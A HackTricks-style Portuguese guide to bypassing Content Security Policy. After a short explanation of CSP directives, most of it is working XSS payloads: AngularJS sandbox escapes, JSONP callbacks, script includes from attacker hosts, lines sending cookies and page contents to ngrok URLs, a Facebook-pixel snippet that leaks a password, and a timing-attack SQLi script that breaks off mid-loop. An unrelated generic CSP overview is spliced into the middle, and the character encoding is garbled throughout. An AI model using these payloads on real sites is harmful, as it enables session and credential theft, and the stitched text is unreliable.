# Bypass de Pol√≠tica de Seguran√ßa de Conte√∫do (CSP)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de recompensas por bugs!

**Insights de Hacking**\
Engaje-se com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais novos bounties de bugs lan√ßados e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje mesmo!

## O que √© CSP

Pol√≠tica de Seguran√ßa de Conte√∫do ou CSP √© uma tecnologia integrada ao navegador que **ajuda a proteger contra ataques como scripting entre sites (XSS)**. Ela lista e descreve caminhos e fontes dos quais o navegador pode carregar recursos de forma segura. Os recursos podem incluir imagens, frames, javascript e mais. Aqui est√° um exemplo de recursos sendo permitidos do dom√≠nio local (self) para serem carregados e executados em linha e permitir fun√ß√µes de execu√ß√£o de c√≥digo como `eval`, `setTimeout` ou `setInterval:`

A Pol√≠tica de Seguran√ßa de Conte√∫do √© implementada via **cabe√ßalhos de resposta** ou **elementos meta da p√°gina HTML**. O navegador segue a pol√≠tica recebida e bloqueia ativamente as viola√ß√µes √† medida que s√£o detectadas.

Implementada via cabe√ßalho de resposta:
```http
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
Implementado via tag meta:
```markup
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Cabe√ßalhos

* `Content-Security-Policy`
* `Content-Security-Policy-Report-Only` Este n√£o bloquear√° nada, apenas enviar√° relat√≥rios (usar em ambiente Pr√©).

## Definindo recursos

CSP funciona restringindo as origens de onde o conte√∫do ativo e passivo pode ser carregado. Ele pode adicionalmente restringir certos aspectos do conte√∫do ativo, como a execu√ß√£o de javascript inline e o uso de `eval()`.
```
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Diretivas

* **script-src**: Esta diretiva especifica fontes permitidas para JavaScript. Isso inclui n√£o apenas URLs carregadas diretamente em elementos, mas tamb√©m coisas como manipuladores de eventos de script inline (onclick) e folhas de estilo XSLT que podem desencadear a execu√ß√£o de scripts.
* **default-src**: Esta diretiva define a pol√≠tica para buscar recursos por padr√£o. Quando diretivas de busca est√£o ausentes no cabe√ßalho CSP, o navegador segue esta diretiva por padr√£o.
* **Child-src**: Esta diretiva define recursos permitidos para web workers e conte√∫dos de frames embutidos.
* **connect-src**: Esta diretiva restringe URLs para carregar usando interfaces como fetch, websocket, XMLHttpRequest.
* **frame-src**: Esta diretiva restringe URLs para frames que podem ser chamados.
* **frame-ancestors**: Esta diretiva especifica as fontes que podem incorporar a p√°gina atual. Esta diretiva aplica-se a [`<frame>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame), [`<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe), [`<object>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object), [`<embed>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed), ou [`<applet>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet). Esta diretiva n√£o pode ser usada em tags e aplica-se apenas a recursos n√£o HTML.
* **img-src**: Define fontes permitidas para carregar imagens na p√°gina da web.
* **font-src**: Diretiva especifica fontes v√°lidas para fontes carregadas usando `@font-face`.
* **manifest-src**: Esta diretiva define fontes permitidas de arquivos de manifesto de aplica√ß√£o.
* **media-src**: Define fontes permitidas de onde objetos de m√≠dia podem ser carregados.
* **object-src**: Define fontes permitidas para os elementos \<object>, \<embed> e \<applet>.
* **base-uri**: Define URLs permitidas que podem ser carregadas usando um elemento.
* **form-action**: Esta diretiva lista endpoints v√°lidos para envio a partir de tags.
* **plugin-types**: Define limites nos tipos de mime types que uma p√°gina pode invocar.
* **upgrade-insecure-requests**: Esta diretiva instrui navegadores a reescrever esquemas de URL, mudando HTTP para HTTPS. Esta diretiva pode ser √∫til para sites com um grande n√∫mero de URLs antigas que precisam ser reescritas.
* **sandbox**: A diretiva sandbox habilita um sandbox para o recurso solicitado semelhante ao atributo sandbox. Aplica restri√ß√µes √†s a√ß√µes de uma p√°gina, incluindo prevenir popups, prevenir a execu√ß√£o de plugins e scripts, e impor uma pol√≠tica de mesma origem.

### **Fontes**

* \*: Permite qualquer URL exceto esquemas `data:`, `blob:`, `filesystem:`.
* **self**: Esta fonte define que o carregamento de recursos na p√°gina √© permitido do mesmo dom√≠nio.
* **data**: Esta fonte permite carregar recursos atrav√©s do esquema data (por exemplo, imagens codificadas em Base64).
* **none**: Esta diretiva n√£o permite que nada seja carregado de qualquer fonte.
* **unsafe-eval**: Permite o uso de eval() e m√©todos semelhantes para criar c√≥digo a partir de strings. N√£o √© uma pr√°tica segura incluir esta fonte em qualquer diretiva. Por essa raz√£o, √© nomeada como insegura.
* **unsafe-hashes**: Permite a ativa√ß√£o de manipuladores de eventos inline espec√≠ficos.
* **unsafe-inline**: Permite o uso de recursos inline, como elementos inline, URLs javascript:, manipuladores de eventos inline e elementos inline. Novamente, isso n√£o √© recomendado por raz√µes de seguran√ßa.
* **nonce**: Uma lista de permiss√µes para scripts inline espec√≠ficos usando um nonce criptogr√°fico (n√∫mero usado uma vez). O servidor deve gerar um valor de nonce √∫nico cada vez que transmite uma pol√≠tica.
* **sha256-\<hash>**: Lista de permiss√µes para scripts com um hash sha256 espec√≠fico.
* **strict-dynamic**: Permite que o navegador carregue e execute novas tags JavaScript no DOM de qualquer fonte de script que tenha sido previamente autorizada por um valor de "nonce" ou "hash".
* **host**: Indica um host como example.com

## Regras CSP Inseguras

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Carga √∫til funcional: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' via Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Carga √∫til funcional:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Se voc√™ conseguir de alguma forma fazer com que um **c√≥digo JS permitido crie uma nova tag de script** no DOM com o seu c√≥digo JS, porque um script permitido est√° criando-o, a **nova tag de script ser√° permitida para execu√ß√£o**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Carga √∫til funcional:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Falta de object-src e default-src

{% hint style="danger" %}
**Parece que isso j√° n√£o funciona mais**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Cargas √∫teis funcionais:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Upload de Arquivo + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Se voc√™ pode fazer upload de um arquivo JS, voc√™ pode contornar esta CSP:

Payload funcional:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
No entanto, √© altamente prov√°vel que o servidor esteja **validando o arquivo enviado** e s√≥ permitir√° que voc√™ **envie tipos determinados de arquivos**.

Al√©m disso, mesmo que voc√™ consiga enviar um **c√≥digo JS dentro** de um arquivo usando uma extens√£o aceita pelo servidor (como: _script.png_), isso n√£o ser√° suficiente porque alguns servidores, como o servidor Apache, **selecionam o tipo MIME do arquivo com base na extens√£o** e navegadores como o Chrome **rejeitar√£o executar c√≥digo Javascript** dentro de algo que deveria ser uma imagem. "Felizmente", existem erros. Por exemplo, de um CTF, aprendi que o **Apache n√£o conhece** a extens√£o _**.wave**_, portanto, ele n√£o a serve com um **tipo MIME como audio/\***.

A partir daqui, se voc√™ encontrar um XSS e um upload de arquivo, e conseguir encontrar uma **extens√£o mal interpretada**, voc√™ poderia tentar enviar um arquivo com essa extens√£o e o conte√∫do do script. Ou, se o servidor estiver verificando o formato correto do arquivo enviado, crie um poliglota ([alguns exemplos de poliglota aqui](https://github.com/Polydet/polyglot-database)).

### Pontos de Extremidade de Terceiros + ('unsafe-eval')

{% hint style="warning" %}
Para alguns dos seguintes payloads, **`unsafe-eval` nem √© necess√°rio**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Carregue uma vers√£o vulner√°vel do angular e execute JS arbitr√°rio:
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads usando Angular + uma biblioteca com fun√ß√µes que retornam o objeto `window` ([confira este post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
O post mostra que voc√™ pode **carregar** todas as **bibliotecas** de `cdn.cloudflare.com` (ou qualquer outro reposit√≥rio permitido de bibliotecas JS), executar todas as fun√ß√µes adicionadas de cada biblioteca e verificar **quais fun√ß√µes de quais bibliotecas retornam o objeto `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>



```
#### Abusando do c√≥digo JS do google recaptcha

De acordo com [**este writeup de CTF**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves), voc√™ pode abusar de [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) dentro de um CSP para executar c√≥digo JS arbitr√°rio contornando o CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### Endpoints de Terceiros + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Cen√°rios como este, onde `script-src` est√° definido como `self` e um dom√≠nio espec√≠fico que est√° na lista de permiss√µes, podem ser contornados usando JSONP. Pontos de extremidade JSONP permitem m√©todos de callback inseguros que permitem a um atacante realizar XSS, payload funcional:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **cont√©m endpoints JSONP prontos para uso para bypass de CSP de diferentes websites.**

A mesma vulnerabilidade ocorrer√° se o **endpoint confi√°vel contiver um Redirecionamento Aberto** porque se o endpoint inicial √© confi√°vel, redirecionamentos tamb√©m s√£o.

### Abusos de Terceiros
Como descrito no [post seguinte](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), existem muitos dom√≠nios de terceiros, que podem estar permitidos em algum lugar no CSP, que podem ser abusados para exfiltrar dados ou executar c√≥digo JavaScript. Alguns desses terceiros s√£o:

| Entidade | Dom√≠nio Permitido | Capacidades |
|----------|-------------------|-------------|
| Facebook | www.facebook.com, *.facebook.com | Exfil |
| Hotjar | *.hotjar.com, ask.hotjar.io | Exfil |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | Exec |
| Amazon CloudFront | *.cloudfront.net | Exfil, Exec |
| Amazon AWS | *.amazonaws.com | Exfil, Exec |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | Exfil, Exec |
| Salesforce Heroku | *.herokuapp.com | Exfil, Exec |
| Google Firebase | *.firebaseapp.com | Exfil, Exec |

Se voc√™ encontrar algum dos dom√≠nios permitidos no CSP do seu alvo, √© prov√°vel que voc√™ consiga fazer um bypass no CSP ao se registrar no servi√ßo de terceiros e, ou exfiltrar dados para esse servi√ßo ou executar c√≥digo.

Por exemplo, se voc√™ encontrar o seguinte CSP:
```
Content-Security-Policy‚Äã: default-src 'self‚Äô www.facebook.com;‚Äã
```
# Bypass de Pol√≠tica de Seguran√ßa de Conte√∫do (CSP)

A Pol√≠tica de Seguran√ßa de Conte√∫do (CSP) √© uma camada adicional de seguran√ßa que ajuda a detectar e mitigar ataques de inje√ß√£o de conte√∫do, como Cross-Site Scripting (XSS). CSP permite que os desenvolvedores web controlem os recursos que a p√°gina pode carregar e executar.

## T√©cnicas Comuns de Bypass

### Uso de Diretivas Inseguras

Se a CSP incluir diretivas inseguras como `'unsafe-inline'` ou `'unsafe-eval'`, pode ser poss√≠vel injetar scripts diretamente ou usar `eval()` para executar c√≥digo JavaScript arbitr√°rio.

### Abuso de Permiss√µes de Origem

Se a CSP confiar em muitas origens ou usar curingas (por exemplo, `*`), um atacante pode explorar essas permiss√µes para carregar recursos maliciosos.

### Explora√ß√£o de Endpoints que Refletem Conte√∫do

Endpoints que refletem o conte√∫do do usu√°rio podem ser usados para contornar a CSP se eles n√£o estiverem adequadamente protegidos.

### Uso de Pol√≠ticas Permissivas em Subdom√≠nios

Subdom√≠nios com pol√≠ticas CSP mais permissivas podem ser explorados para contornar restri√ß√µes em dom√≠nios principais mais seguros.

## Ferramentas para Testar CSP

- **CSP Evaluator**: Uma ferramenta online que permite verificar se uma pol√≠tica CSP √© forte e identificar poss√≠veis problemas.
- **CSP Tester**: Uma extens√£o do Chrome que ajuda a testar a efic√°cia de uma pol√≠tica CSP em um site.
- **CSP Auditor**: Uma ferramenta que analisa a CSP de um site e relata poss√≠veis problemas.

## Conclus√£o

Entender e testar a efic√°cia da CSP √© crucial para a seguran√ßa de um site. Embora a CSP possa ser uma defesa poderosa contra ataques de inje√ß√£o, √© importante estar ciente das t√©cnicas de bypass e garantir que a pol√≠tica esteja configurada corretamente.
```
Content-Security-Policy‚Äã: connect-src www.facebook.com;‚Äã
```
Voc√™ deve ser capaz de exfiltrar dados, de forma semelhante ao que sempre foi feito com [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). Neste caso, voc√™ segue estes passos gerais:

1. Crie uma conta de Desenvolvedor no Facebook aqui.
1. Crie um novo aplicativo "Facebook Login" e selecione "Website".
1. V√° para "Configura√ß√µes -> B√°sico" e obtenha seu "App ID".
1. No site alvo de onde voc√™ quer exfiltrar dados, voc√™ pode exfiltrar dados usando diretamente o gadget do SDK do Facebook "fbq" atrav√©s de um "customEvent" e o payload de dados.
1. V√° para o "Gerenciador de Eventos" do seu aplicativo e selecione o aplicativo que voc√™ criou (observe que o gerenciador de eventos pode ser encontrado em uma URL semelhante a esta: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events
1. Selecione a aba "Test Events" para ver os eventos sendo enviados pelo "seu" site.

Ent√£o, no lado da v√≠tima, voc√™ executa o seguinte c√≥digo para inicializar o pixel de rastreamento do Facebook para apontar para o app-id da conta de desenvolvedor do Facebook do atacante e emitir um evento personalizado como este:
```JavaScript
fbq('init', '1279785999289471');‚Äã // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{‚Äã
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"‚Äã
});
```
### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Al√©m do redirecionamento mencionado anteriormente para contornar restri√ß√µes de caminho, existe outra t√©cnica chamada Relative Path Overwrite (RPO) que pode ser usada em alguns servidores.

Por exemplo, se o CSP permite o caminho `https://example.com/scripts/react/`, ele pode ser contornado da seguinte forma:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
O navegador acabar√° carregando `https://example.com/scripts/angular/angular.js`.

Isso funciona porque, para o navegador, voc√™ est√° carregando um arquivo chamado `..%2fangular%2fangular.js` localizado em `https://example.com/scripts/react/`, o que est√° em conformidade com a CSP.

No entanto, para certos servidores, ao receber a solicita√ß√£o, eles a decodificar√£o, efetivamente solicitando `https://example.com/scripts/react/../angular/angular.js`, que √© equivalente a `https://example.com/scripts/angular/angular.js`.

Ao **explorar essa inconsist√™ncia na interpreta√ß√£o de URLs entre o navegador e o servidor, as regras de caminho podem ser contornadas**.

A solu√ß√£o √© n√£o tratar `%2f` como `/` no lado do servidor, garantindo uma interpreta√ß√£o consistente entre o navegador e o servidor para evitar esse problema.

Exemplo Online:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Execu√ß√£o de JS em Iframes

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### **base-uri** ausente

Se a diretiva **base-uri** estiver ausente, voc√™ pode abusar dela para realizar uma [**inje√ß√£o de marca√ß√£o pendente**](../dangling-markup-html-scriptless-injection/).

Al√©m disso, se a **p√°gina estiver carregando um script usando um caminho relativo** (como `<script src="/js/app.js">`) usando um **Nonce**, voc√™ pode abusar da **tag base** para fazer com que ela **carregue** o script do **seu pr√≥prio servidor, alcan√ßando um XSS.**\
Se a p√°gina vulner√°vel for carregada com **httpS**, use uma URL httpS na base.
```html
<base href="https://www.attacker.com/">
```
### Eventos AngularJS

Dependendo da pol√≠tica espec√≠fica, o CSP bloquear√° eventos JavaScript. No entanto, o AngularJS define seus pr√≥prios eventos que podem ser usados em substitui√ß√£o. Quando dentro de um evento, o AngularJS define um objeto especial `$event`, que simplesmente referencia o objeto de evento do navegador. Voc√™ pode usar este objeto para realizar um bypass no CSP. No Chrome, existe uma propriedade especial no objeto `$event/event` chamada `path`. Esta propriedade cont√©m um array de objetos que fazem com que o evento seja executado. A √∫ltima propriedade √© sempre o objeto `window`, que podemos usar para realizar uma fuga de sandbox. Ao passar este array para o filtro `orderBy`, podemos enumerar o array e usar o √∫ltimo elemento (o objeto `window`) para executar uma fun√ß√£o global, como `alert()`. O c√≥digo a seguir demonstra isso:
```markup
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
**Encontre outras formas de contornar o Angular em** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS e dom√≠nio na lista branca
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Se a aplica√ß√£o estiver usando Angular JS e os scripts forem carregados de um dom√≠nio na lista de permiss√µes, √© poss√≠vel contornar essa pol√≠tica CSP chamando fun√ß√µes de retorno e classes vulner√°veis. Para mais detalhes, visite este incr√≠vel reposit√≥rio [git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).

Payloads funcionais:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Outros pontos de execu√ß√£o arbitr√°ria JSONP podem ser encontrados [**aqui**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (alguns deles foram exclu√≠dos ou corrigidos)

### Bypass via Redirecionamento

O que acontece quando o CSP encontra um redirecionamento do lado do servidor? Se o redirecionamento levar a uma origem diferente que n√£o √© permitida, ainda assim falhar√°.

No entanto, de acordo com a descri√ß√£o em [CSP spec 4.2.2.3. Caminhos e Redirecionamentos](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), se o redirecionamento levar a um caminho diferente, ele pode contornar as restri√ß√µes originais.

Aqui est√° um exemplo:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Se o CSP estiver definido para `https://www.google.com/a/b/c/d`, como o caminho √© considerado, ambos os scripts `/test` e `/a/test` ser√£o bloqueados pelo CSP.

No entanto, o final `http://localhost:5555/301` ser√° **redirecionado no lado do servidor para `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. Como √© um redirecionamento, o **caminho n√£o √© considerado**, e o **script pode ser carregado**, contornando assim a restri√ß√£o do caminho.

Com este redirecionamento, mesmo que o caminho seja especificado completamente, ele ainda ser√° contornado.

Portanto, a melhor solu√ß√£o √© garantir que o site n√£o tenha vulnerabilidades de redirecionamento aberto e que n√£o existam dom√≠nios que possam ser explorados nas regras do CSP.

### Contornar o CSP com marca√ß√£o pendente

Leia [como aqui](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
```markdown
`'unsafe-inline'` significa que voc√™ pode executar qualquer script dentro do c√≥digo (XSS pode executar c√≥digo) e `img-src *` significa que voc√™ pode usar na p√°gina da web qualquer imagem de qualquer recurso.

Voc√™ pode contornar essa CSP exfiltrando os dados por meio de imagens (nesta ocasi√£o, o XSS abusa de um CSRF onde uma p√°gina acess√≠vel pelo bot cont√©m um SQLi e extrai a bandeira por meio de uma imagem):
```
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
Voc√™ tamb√©m pode abusar dessa configura√ß√£o para **carregar c√≥digo javascript inserido dentro de uma imagem**. Se, por exemplo, a p√°gina permite carregar imagens do Twitter. Voc√™ poderia **criar** uma **imagem especial**, **fazer upload** dela no Twitter e abusar do "**unsafe-inline**" para **executar** um c√≥digo JS (como um XSS comum) que ir√° **carregar** a **imagem**, **extrair** o **JS** dela e **execut√°-lo**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Com Service Workers

A fun√ß√£o **`importScripts`** dos service workers n√£o √© limitada pelo CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Inje√ß√£o de Pol√≠tica

**Pesquisa:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Se um **par√¢metro** enviado por voc√™ est√° sendo **colado dentro** da **declara√ß√£o** da **pol√≠tica**, ent√£o voc√™ poderia **alterar** a **pol√≠tica** de alguma forma que a torne **in√∫til**. Voc√™ poderia **permitir script 'unsafe-inline'** com qualquer um desses bypasses:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Porque esta diretiva ir√° **sobrescrever as diretivas script-src existentes**.\
Voc√™ pode encontrar um exemplo aqui: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

No Edge √© muito mais simples. Se voc√™ puder adicionar no CSP apenas isto: **`;_`** o **Edge** ir√° **descartar** toda a **pol√≠tica**.\
Exemplo: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; via XSS (iframe) - Ataque de tempo

Note a falta da diretiva `'unsafe-inline'`\
Desta vez voc√™ pode fazer a v√≠tima **carregar** uma p√°gina **sob seu controle** via **XSS** com um `<iframe>`. Desta vez, voc√™ vai fazer a v√≠tima acessar a p√°gina de onde voc√™ quer extrair informa√ß√µes (**CSRF**). Voc√™ n√£o pode acessar o conte√∫do da p√°gina, mas se de alguma forma voc√™ puder **controlar o tempo que a p√°gina leva para carregar**, voc√™ poder√° extrair as informa√ß√µes necess√°rias.

Desta vez, uma **flag** ser√° extra√≠da, sempre que um **caractere for adivinhado corretamente** via SQLi, a **resposta** leva **mais tempo** devido √† fun√ß√£o sleep. Ent√£o, voc√™ ser√° capaz de extrair a flag:
```javascript
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
